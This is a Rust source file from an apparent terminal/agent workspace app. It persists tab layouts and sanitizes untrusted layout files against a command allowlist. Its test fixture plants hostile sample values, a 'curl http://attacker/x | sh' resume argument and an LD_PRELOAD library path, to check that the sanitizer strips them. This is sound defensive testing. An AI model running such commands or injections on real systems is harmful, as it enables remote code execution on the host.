use std::collections::{HashMap, HashSet};
use std::path::{Path, PathBuf};

use serde_json::Value;

use crate::schema::project::{OpenApp, TabEntry};
use crate::schema::session::TerminalSession;
use crate::storage;

/// Save tab layout into a project.json, preserving all other fields.
/// Also mirrors the layout to `.eldrun/sessions/terminals.json`.
/// `groups` is the opaque split/group layout tree (None clears it).
/// `sessions` is the opaque list of open agent-session UUIDs: `Some([])` clears
/// it, `Some(list)` replaces it, and `None` leaves the stored value untouched.
///
/// `allow_clear` is what makes an EMPTY `tabs` mean "the user closed every tab"
/// rather than "the caller had nothing loaded". Only the frontend can tell those
/// apart, and it only knows for a scope it actually hydrated — see the guard in
/// `write_terminal_session`.
pub fn save_tab_layout(
    local_file: &str,
    tabs: &[TabEntry],
    groups: Option<Value>,
    sessions: Option<Value>,
    allow_clear: bool,
) -> Result<(), String> {
    write_terminal_session(local_file, tabs, 0, groups, sessions, allow_clear)
}

/// Save tab layout with the active tab index.
/// Writes to `.eldrun/sessions/terminals.json` (including active_tab_index)
/// and also saves to `project.json` (which does not store active_tab_index).
pub fn save_terminal_session(
    local_file: &str,
    tabs: &[TabEntry],
    active_tab_index: usize,
    groups: Option<Value>,
) -> Result<(), String> {
    // The project-switch snapshot carries no session list; leave the persisted
    // UUIDs untouched (the active project's debounced save_tab_layout owns them).
    // It also never clears: a snapshot is a picture of what was in memory, and an
    // empty one is far more likely to mean "this scope was never loaded" than
    // "the user closed everything" — the debounced save owns that intent.
    write_terminal_session(local_file, tabs, active_tab_index, groups, None, false)
}

fn write_terminal_session(
    local_file: &str,
    tabs: &[TabEntry],
    active_tab_index: usize,
    groups: Option<Value>,
    sessions: Option<Value>,
    allow_clear: bool,
) -> Result<(), String> {
    // An empty layout is DESTRUCTIVE — it drops `tab_layout`/`tab_groups` from
    // project.json *and* overwrites the `.eldrun` mirror with an empty one, in a
    // single call. The two are written from the same array, so the mirror is not a
    // backup: one empty save takes both copies, and a persisted agent tab's
    // `sessionId` is the only handle on its conversation.
    //
    // That is fine when the user really did close every tab, and catastrophic
    // otherwise — and "otherwise" is reachable, which is how a live project lost four
    // tabs on detach: the frontend's debounced autosave persists the tab store's
    // CURRENT scope into the ACTIVE project's `local_file`, two values it tracks
    // independently. Detach swaps `local_file` (state dir → promoted mirror) under
    // a store whose scope has not caught up, the per-scope tab filter correctly
    // refuses to write another project's tabs into this file, and what lands is an
    // empty list that reads exactly like a deliberate close-all.
    //
    // So an empty layout only clears when the caller states it means one.
    if tabs.is_empty() && !allow_clear {
        return Ok(());
    }
    let path = PathBuf::from(local_file);
    let mut project: crate::schema::project::Project =
        storage::read_json(&path).unwrap_or_default();
    project.tab_layout = if tabs.is_empty() {
        None
    } else {
        Some(tabs.to_vec())
    };
    // Clear the tree when there are no tabs; otherwise persist what was sent
    // (a missing tree is tolerated → frontend rebuilds a single group on load).
    project.tab_groups = if tabs.is_empty() { None } else { groups.clone() };
    // Only touch the persisted session UUIDs when a list was supplied; an empty
    // list clears them, a missing list (None) preserves what's on disk.
    if let Some(sessions) = sessions {
        let is_empty = sessions.as_array().is_some_and(|a| a.is_empty());
        project.open_tab_sessions = if is_empty { None } else { Some(sessions) };
    }
    storage::write_json(&path, &project).map_err(|e| e.to_string())?;

    // Mirror to .eldrun/sessions/terminals.json.
    if let Some(sessions_dir) = eldrun_sessions_dir(local_file) {
        let session = TerminalSession {
            tab_layout: tabs.to_vec(),
            active_tab_index,
            tab_groups: if tabs.is_empty() { None } else { groups.clone() },
            extra: Default::default(),
        };
        if let Err(e) = storage::write_json(&sessions_dir.join("terminals.json"), &session) {
            eprintln!("terminal_service: write .eldrun session: {e}");
        }
    }

    Ok(())
}

/// Load tab layout. Tries `.eldrun/sessions/terminals.json` first; falls back
/// to `project.json` if the session file is absent or unreadable.
pub fn load_tab_layout(local_file: &str) -> Vec<TabEntry> {
    load_terminal_session(local_file).tab_layout
}

/// Load the full terminal session (tab layout + active tab index).
/// Tries `.eldrun/sessions/terminals.json` first; falls back to `project.json`
/// for the tab layout (active_tab_index will be 0 on fallback).
///
/// **The layout is untrusted input.** Both files it reads live inside the project
/// tree: `.eldrun/sessions/terminals.json` and `project.json` sit in the project
/// container's writable rw mount, and a cloned/imported repository can ship either.
/// Yet the frontend rehydrates `cmd` / `resumeArgs` / `env` / `cwd` / `location`
/// from them straight into `pty_spawn`. So everything read here is passed through
/// [`sanitize_tab_layout`] before any caller sees it.
pub fn load_terminal_session(local_file: &str) -> TerminalSession {
    let mut session = match read_session_file(local_file) {
        Some(session) => session,
        None => {
            let (tab_layout, tab_groups) = read_project_tab_state(local_file);
            TerminalSession {
                tab_layout,
                active_tab_index: 0,
                tab_groups,
                extra: Default::default(),
            }
        }
    };
    sanitize_loaded_layout(&mut session.tab_layout);
    session
}

// ── Untrusted-layout sanitizing ───────────────────────────────────────────────

/// The internal pane markers a persisted `cmd` may name. These spawn no process at
/// all (the frontend renders a pane for them), and are listed so a marker tab is
/// not needlessly downgraded to a shell.
const PANE_MARKER_CMDS: &[&str] = &[
    "__eldrun_files__",
    "__eldrun_project_files__",
    "__eldrun_blob__",
    "__eldrun_network__",
    "__eldrun_monitor__",
    "__eldrun_diskusage__",
    "__eldrun_calendar__",
    "__eldrun_mail__",
];

/// Agent CLIs a persisted tab may relaunch. Mirrors the frontend's `AGENT_CMDS`
/// plus the local-model drivers (`commands::ollama::LOCAL_DRIVERS`), because those
/// are the only commands `loadFromLayout` can legitimately have written.
const AGENT_CMDS: &[&str] = &[
    "claude",
    "codex",
    "gemini",
    "vibe",
    "aider",
    "opencode",
    "cursor-agent",
    "copilot",
    "grok",
    "qwen",
    "openclaw",
    "droid",
    "ollama",
];

/// Script interpreters a Run tab persists as its `cmd` (`lib/shellScriptRun.ts`'s
/// `ScriptShell`, plus bare `sh`). A Python Run tab persists `cmd: ""` and types
/// its command line as input instead, so no interpreter path appears here.
const SCRIPT_INTERP_CMDS: &[&str] = &["sh", "bash", "zsh", "fish", "ksh", "powershell", "cmd"];

/// Every command a persisted tab entry may carry: the empty string (the host's
/// default shell), the pane markers, the agent CLIs, the script interpreters, and
/// whatever the user configured as a **custom agent** — the latter read from
/// `settings.json` in the state dir, which no container mounts, so it is a
/// trustworthy source even though the layout naming it is not.
fn known_tab_commands(custom: &HashMap<String, Vec<String>>) -> HashSet<String> {
    let mut set: HashSet<String> = HashSet::new();
    set.insert(String::new());
    for c in PANE_MARKER_CMDS.iter().chain(AGENT_CMDS).chain(SCRIPT_INTERP_CMDS) {
        set.insert((*c).to_string());
    }
    for cmd in custom.keys() {
        set.insert(cmd.clone());
    }
    set
}

/// The user's custom agents as `cmd → resume argv`, read from
/// `Settings.custom_agents` (the settings `extra` catch-all).
///
/// `settings.json` lives in the state dir, which no container mounts, so this is
/// the trustworthy source for **both** questions the sanitizer asks: which command
/// a persisted layout may name, and what argv that command's resume is allowed to
/// use. A custom agent with no resume flag maps to an empty vector — it is
/// launch-only, so a persisted `resumeArgs` for it is never legitimate.
fn custom_agent_specs() -> HashMap<String, Vec<String>> {
    let path = storage::state_dir().join("settings.json");
    let Ok(settings) = storage::read_json::<crate::schema::Settings>(&path) else {
        return HashMap::new();
    };
    settings
        .extra
        .get("custom_agents")
        .and_then(Value::as_array)
        .map(|list| {
            list.iter()
                .filter_map(|a| {
                    let cmd = a.get("cmd").and_then(Value::as_str)?.trim();
                    if cmd.is_empty() {
                        return None;
                    }
                    let resume = a
                        .get("resumeArgs")
                        .and_then(Value::as_array)
                        .map(|v| {
                            v.iter().filter_map(Value::as_str).map(str::to_string).collect()
                        })
                        .unwrap_or_default();
                    Some((cmd.to_string(), resume))
                })
                .collect()
        })
        .unwrap_or_default()
}

/// Sanitize an untrusted persisted layout in place against the current known-good
/// command set. The entry point for callers that read `project.json` themselves
/// (`commands::projects::load_project`, which the frontend's relaunch path uses)
/// rather than going through [`load_terminal_session`].
pub fn sanitize_loaded_layout(tabs: &mut [TabEntry]) {
    let custom = custom_agent_specs();
    sanitize_tab_layout(tabs, &known_tab_commands(&custom), &custom);
}

/// Neutralize every layout entry whose `cmd` is not a known tab command.
///
/// Entries are **kept**, not dropped: the tab still comes back (with its label,
/// kind and cwd) so a restore never silently loses a pane. What is removed is the
/// entry's authority — its `cmd` becomes the plain default shell, and the fields
/// that would carry attacker-chosen argv, environment or locality into
/// `pty_spawn` (`resumeArgs`, `env`, `location`, `sessionId`) are stripped. A tab
/// whose `cmd` *is* known keeps all of them, so legitimate agent resume, remote
/// locality and vibe's `VIBE_HOME` are untouched.
///
/// `sessionId` goes too: with `cmd` reset the entry is no longer a resumable agent
/// tab, and a leftover id would only make `isResumableAgentTab` disagree with it.
pub fn sanitize_tab_layout(
    tabs: &mut [TabEntry],
    known: &HashSet<String>,
    custom: &HashMap<String, Vec<String>>,
) {
    for tab in tabs.iter_mut() {
        if known.contains(&tab.cmd) {
            rebuild_resume_args(tab, custom);
            continue;
        }
        eprintln!(
            "terminal_service: persisted tab '{}' names an unknown command '{}' — restoring it as \
             a plain shell and dropping its args/env/location",
            tab.label, tab.cmd
        );
        tab.cmd = String::new();
        tab.session_id = None;
        for key in ["resumeArgs", "env", "location", "args", "agentMode"] {
            tab.extra.remove(key);
        }
    }
}

/// Replace a known-command entry's persisted `resumeArgs` with the value its
/// *trustworthy* source states, or remove the field when there is no such value.
///
/// A known `cmd` is not enough on its own: `resumeArgs` is handed to the restored
/// tab as its launch argv, so a persisted vector is a free choice of arguments to
/// whichever binary the (also persisted) `cmd` names. For the host-bound agent
/// CLIs that is a host-side exec with attacker-chosen flags — the container is not
/// involved, because those tabs are deliberately allowed to run on the host.
///
/// Neither kind of agent needs the persisted value:
/// - a **built-in** rebuilds its flag from the frontend's `RESUMABLE_AGENTS` table
///   (keyed on `cmd`, fed the captured session id), so the field is redundant;
/// - a **custom** agent's flag is part of its `settings.json` spec, which is where
///   the frontend put it in the first place.
///
/// So the field is dropped for everything except a registered custom agent, whose
/// value is re-read from the spec rather than trusted from disk. A tab that is left
/// with no `resumeArgs` and whose `cmd` is not in the built-in table simply stops
/// being a resumable agent tab (`isResumableAgentTab`) and restores with no args.
fn rebuild_resume_args(tab: &mut TabEntry, custom: &HashMap<String, Vec<String>>) {
    match custom.get(&tab.cmd) {
        Some(resume) if !resume.is_empty() => {
            let want = Value::Array(resume.iter().map(|a| Value::String(a.clone())).collect());
            if tab.extra.get("resumeArgs") != Some(&want) {
                tab.extra.insert("resumeArgs".to_string(), want);
            }
        }
        _ => {
            tab.extra.remove("resumeArgs");
        }
    }
}

fn read_session_file(local_file: &str) -> Option<TerminalSession> {
    if let Some(sessions_dir) = eldrun_sessions_dir(local_file) {
        let session_path = sessions_dir.join("terminals.json");
        if session_path.exists() {
            if let Ok(session) = storage::read_json::<TerminalSession>(&session_path) {
                return Some(session);
            }
        }
    }
    None
}

/// Read both the flat tab layout and the opaque layout tree from project.json.
fn read_project_tab_state(local_file: &str) -> (Vec<TabEntry>, Option<Value>) {
    let path = PathBuf::from(local_file);
    match storage::read_json::<crate::schema::project::Project>(&path) {
        Ok(p) => (p.tab_layout.unwrap_or_default(), p.tab_groups),
        Err(_) => (Vec::new(), None),
    }
}

/// Load open_apps list from a project.json.
pub fn load_open_apps(local_file: &str) -> Vec<OpenApp> {
    let path = PathBuf::from(local_file);
    storage::read_json::<crate::schema::project::Project>(&path)
        .ok()
        .and_then(|p| p.open_apps)
        .unwrap_or_default()
}

// ── helpers ───────────────────────────────────────────────────────────────

pub fn eldrun_sessions_dir(local_file: &str) -> Option<PathBuf> {
    Path::new(local_file)
        .parent()
        .map(|p| p.join(".eldrun").join("sessions"))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn entry(cmd: &str) -> TabEntry {
        let mut extra = std::collections::HashMap::new();
        extra.insert("location".to_string(), Value::String("local".to_string()));
        extra.insert(
            "resumeArgs".to_string(),
            serde_json::json!(["-c", "curl http://attacker/x | sh"]),
        );
        extra.insert("env".to_string(), serde_json::json!({ "LD_PRELOAD": "/tmp/x.so" }));
        extra.insert("kind".to_string(), Value::String("local_agent".to_string()));
        TabEntry {
            key: "t1".to_string(),
            label: "Shell".to_string(),
            cmd: cmd.to_string(),
            cwd: "/tmp".to_string(),
            session_id: Some("00000000-0000-0000-0000-000000000000".to_string()),
            extra,
        }
    }

    fn known() -> HashSet<String> {
        let mut set: HashSet<String> = HashSet::new();
        set.insert(String::new());
        for c in PANE_MARKER_CMDS.iter().chain(AGENT_CMDS).chain(SCRIPT_INTERP_CMDS) {
            set.insert((*c).to_string());
        }
        set
    }

    fn no_custom() -> HashMap<String, Vec<String>> {
        HashMap::new()
    }

    fn resume_args(tab: &TabEntry) -> Option<Vec<String>> {
        Some(
            tab.extra
                .get("resumeArgs")?
                .as_array()?
                .iter()
                .filter_map(Value::as_str)
                .map(str::to_string)
                .collect(),
        )
    }

    #[test]
    fn unknown_command_is_downgraded_to_a_plain_shell() {
        // Variant B of the persisted-layout escape: a planted `shell` entry whose
        // cmd is a script the same writer dropped into the project.
        let mut tabs = vec![entry("/home/u/proj/pwn.sh")];
        sanitize_tab_layout(&mut tabs, &known(), &no_custom());
        assert_eq!(tabs[0].cmd, "");
        assert!(tabs[0].session_id.is_none());
        assert!(!tabs[0].extra.contains_key("resumeArgs"));
        assert!(!tabs[0].extra.contains_key("env"));
        assert!(!tabs[0].extra.contains_key("location"));
        // The tab itself survives — restore never silently loses a pane.
        assert_eq!(tabs[0].label, "Shell");
        assert_eq!(tabs[0].cwd, "/tmp");
        assert_eq!(tabs[0].key, "t1");
        assert!(tabs[0].extra.contains_key("kind"));
    }

    #[test]
    fn bash_dash_c_payload_is_downgraded_even_though_bash_is_a_run_interpreter() {
        // `bash` is a legitimate Run-tab interpreter, so it stays known — but its
        // authority fields only survive because the cmd is known; the argv itself
        // is what `pty_spawn`'s authority resolution and the container now bound.
        let mut tabs = vec![entry("bash"), entry("definitely-not-an-agent")];
        sanitize_tab_layout(&mut tabs, &known(), &no_custom());
        assert_eq!(tabs[0].cmd, "bash");
        assert_eq!(tabs[1].cmd, "");
    }

    #[test]
    fn known_commands_keep_every_field_except_resume_args() {
        for cmd in ["", "claude", "codex", "vibe", "__eldrun_files__", "__eldrun_mail__", "zsh"] {
            let mut tabs = vec![entry(cmd)];
            sanitize_tab_layout(&mut tabs, &known(), &no_custom());
            assert_eq!(tabs[0].cmd, cmd, "'{cmd}' must be accepted verbatim");
            assert!(tabs[0].session_id.is_some(), "'{cmd}' must keep its session id");
            assert!(tabs[0].extra.contains_key("location"), "'{cmd}' keeps locality");
            assert!(tabs[0].extra.contains_key("env"), "'{cmd}' keeps env");
        }
    }

    #[test]
    fn a_custom_agent_command_is_accepted_when_registered() {
        let mut tabs = vec![entry("my-agent")];
        sanitize_tab_layout(&mut tabs, &known(), &no_custom());
        assert_eq!(tabs[0].cmd, "", "unregistered custom command is neutralized");

        let custom = HashMap::from([("my-agent".to_string(), vec!["--continue".to_string()])]);
        let mut tabs = vec![entry("my-agent")];
        sanitize_tab_layout(&mut tabs, &known_tab_commands(&custom), &custom);
        assert_eq!(tabs[0].cmd, "my-agent");
    }

    #[test]
    fn a_built_in_agents_persisted_resume_argv_is_dropped() {
        // The residual half of the persisted-layout escape: `cmd` alone was enough
        // to keep `resumeArgs`, and for the host-bound agent CLIs that argv is
        // executed on the HOST (the container is deliberately skipped for them). The
        // frontend rebuilds a built-in's flag from RESUMABLE_AGENTS, so the
        // persisted vector is redundant as well as dangerous.
        for cmd in ["claude", "codex", "vibe", "opencode", "droid", "openclaw", "ollama"] {
            let mut tabs = vec![entry(cmd)];
            sanitize_tab_layout(&mut tabs, &known(), &no_custom());
            assert_eq!(tabs[0].cmd, cmd);
            assert_eq!(
                resume_args(&tabs[0]),
                None,
                "'{cmd}' must not carry a persisted resume argv",
            );
        }
    }

    #[test]
    fn a_custom_agents_resume_argv_is_rebuilt_from_its_settings_spec() {
        // The spec in settings.json is authoritative, so a planted vector is
        // replaced by it rather than trusted — and a launch-only custom agent
        // (no resume flag in its spec) loses the field entirely.
        let custom = HashMap::from([
            ("my-agent".to_string(), vec!["--continue".to_string()]),
            ("launch-only".to_string(), Vec::new()),
        ]);
        let set = known_tab_commands(&custom);

        let mut tabs = vec![entry("my-agent")];
        sanitize_tab_layout(&mut tabs, &set, &custom);
        assert_eq!(resume_args(&tabs[0]), Some(vec!["--continue".to_string()]));

        let mut tabs = vec![entry("launch-only")];
        sanitize_tab_layout(&mut tabs, &set, &custom);
        assert_eq!(resume_args(&tabs[0]), None);
    }
}
